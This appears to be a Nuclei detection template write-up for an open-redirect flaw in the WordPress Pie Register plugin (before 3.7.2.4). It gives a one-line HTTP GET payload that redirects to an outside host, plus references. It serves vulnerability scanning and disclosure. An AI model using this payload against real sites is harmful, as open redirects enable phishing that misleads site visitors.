# Nuclei Template: WordPress Pie Register < 3.7.2.4 - Open Redirect
**Template ID:** pieregister-open-redirect
**Vulnerability Class:** Open Redirect
**Severity:** Low
**CWE:** CWE-601
**Source:** Nuclei Template (`pieregister-open-redirect.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Pie Register < 3.7.2.4 is susceptible to an open redirect vulnerability because the plugin passes unvalidated user input to the wp_redirect() function.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/?piereg_logout_url=true&redirect_to=https://interact.sh
```

## References
- https://wpscan.com/vulnerability/f6efa32f-51df-44b4-bbba-e67ed5785dd4
- https://wordpress.org/plugins/pie-register/
